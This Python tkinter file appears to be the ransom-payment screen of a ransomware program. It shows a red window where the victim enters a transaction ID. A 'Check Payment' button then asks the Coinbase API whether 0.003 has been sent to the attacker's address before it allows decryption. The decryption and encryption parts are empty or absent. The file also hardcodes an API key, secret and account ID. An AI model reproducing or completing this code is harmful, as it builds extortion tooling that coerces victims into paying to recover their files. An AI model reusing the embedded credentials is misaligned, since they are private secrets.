import tkinter as tk
from tkinter import filedialog, Text
from coinbase.wallet.client import Client
import os

root = tk.Tk()

canvas = tk.Canvas(root, height=800, width=1250, bg="#841212")
canvas.pack()

canDecrypt = False


def decryption_start():
    global canDecrypt
    if not canDecrypt:
        pass
    else:
        pass

# "b605656f-5bad-51ec-b200-c368aeac3fbe"


def check_payment():
    global canDecrypt
    transaction_id = client_transaction_id.get("1.0", tk.END+"-1c")
    api_key = 'ixhbHrVaDtbmlQQJ'
    api_secret = 'bwlPbxI86g8BSnp7TKb6eFMW47n40B92'
    account_id = "ce4c1a1f-65a4-5098-b6ac-b2f0f16f603f"

    client = Client(api_key, api_secret)
    transaction = client.get_transaction(account_id, transaction_id)
    canDecrypt = transaction["amount"]["amount"] == "0.003" and transaction["to"]["address"] == "my_address"
    # Changes should me made to canDecrypt.
    print(transaction, canDecrypt)
    # GUI CHANGES HERE...

# ["to"]["address"]


client_transaction_id = Text(root, height=2, width=40)
client_transaction_id.place(x=550, y=700)
transaction_id_writing = tk.Label(root, text="Transaction id here:", height=2)
transaction_id_writing.place(x=430, y=700)
CheckPayment = tk.Button(root, text="Check Payment", fg="black", bg="white", padx=130, pady=5, command=check_payment)
CheckPayment.place(x=900, y=700)
img = tk.PhotoImage(file="bitcoin.png")
canvas.create_image(900, 770, image=img)

root.mainloop()